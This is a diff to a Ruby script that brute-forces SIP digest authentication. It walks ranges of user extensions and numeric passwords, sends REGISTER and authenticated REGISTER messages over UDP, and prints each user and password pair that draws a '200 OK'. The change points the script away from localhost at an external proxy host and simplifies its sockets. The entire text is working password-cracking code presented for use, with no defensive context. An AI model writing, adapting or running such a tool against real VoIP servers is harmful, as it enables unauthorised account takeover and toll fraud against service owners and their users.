@@ -11,11 +11,10 @@ pass_max=109999
 
 method="REGISTER"
 #domain="proxy.uphreak.com"
-domain="127.0.0.1"
+domain="proxy.uphreak.com"
 uri="sip:#{domain}"
 
-send_port=5060
-listen_port=5061
+port=5060
 
 
 # this function generates the response to a auth request
@@ -37,38 +36,33 @@ def get_response(user,realm,pass,method,uri,nonce)
   return response
 end
 
-# open up a udp send_socket to send messages
-send_sock = UDPSocket.new
-listen_sock = UDPSocket.new
-
-# we need to bind the listen sock to listen port on any local ip
-listen_sock.bind("",listen_port)
+# open up a udp socket to send messages
+sock = UDPSocket.new
 
 for user in user_min..user_max
   puts "brute forcing user #{user} on #{domain} with password range #{pass_min}-#{pass_max}"
   start = Time.now
   for pass in pass_min..pass_max
-    puts pass
     # setup the initial registration sip message
     sipmsgs={}
 sipmsgs[:register]=<<END
 #{method} #{uri} SIP/2.0\r
-Via: SIP/2.0/UDP 127.0.0.1:#{listen_port};rport;branch=foo\r
+Via: SIP/2.0/UDP 127.0.0.1:#{port};rport;branch=foo\r
 Max-Forwards: 70\r
 From: <sip:#{user}@#{domain}>;tag=bar\r
 To: <sip:#{user}@#{domain}>\r
 Call-ID: bas\r
 CSeq: 1 #{method}\r
 User-Agent: SUCKR\r
-Contact: <sip:#{user}@127.0.0.1:#{listen_port}>\r
+Contact: <sip:#{user}@127.0.0.1:#{port}>\r
 Expires: 300\r
 Content-Length:  0\r
 END
 
     # send it a registration message
-    send_sock.send(sipmsgs[:register],0,domain,send_port)
+    sock.send(sipmsgs[:register],0,domain,port)
     # listen for response
-    reg_response=listen_sock.recvfrom(1755)
+    reg_response=sock.recvfrom(1755)
     # get the Authorization header and parse out the realm and nonce
     realm=""
     nonce=""
@@ -92,23 +86,23 @@ END
     # build a new sip message to reply with
 sipmsgs[:register_auth]=<<END
 #{method} #{uri} SIP/2.0\r
-Via: SIP/2.0/UDP 127.0.0.1:#{listen_port};rport;branch=foo\r
+Via: SIP/2.0/UDP 127.0.0.1:#{port};rport;branch=foo\r
 Max-Forwards: 70\r
 From: <sip:#{user}@#{domain}>;tag=bar\r
 To: <sip:#{user}@#{domain}>\r
 Call-ID: bas\r
 CSeq: 2 #{method}\r
 User-Agent: SUCKR\r
-Contact: <sip:#{user}@127.0.0.1:#{listen_port}>\r
+Contact: <sip:#{user}@127.0.0.1:#{port}>\r
 Expires: 300\r
 Authorization: Digest username="#{user}", realm="#{realm}", nonce="#{nonce}", uri="#{uri}", response="#{response}"\r
 Content-Length:  0\r
 END
 
     # send the sip message
-    send_sock.send(sipmsgs[:register_auth],0,domain,send_port)
+    sock.send(sipmsgs[:register_auth],0,domain,port)
     # listen for response
-    auth_response=listen_sock.recvfrom(1755)
+    auth_response=sock.recvfrom(1755)
     if(auth_response[0] =~ /200 OK/)
        puts "#{user},#{pass},#{domain}"
        # we have cracked a password - so we can break out of the inner loop
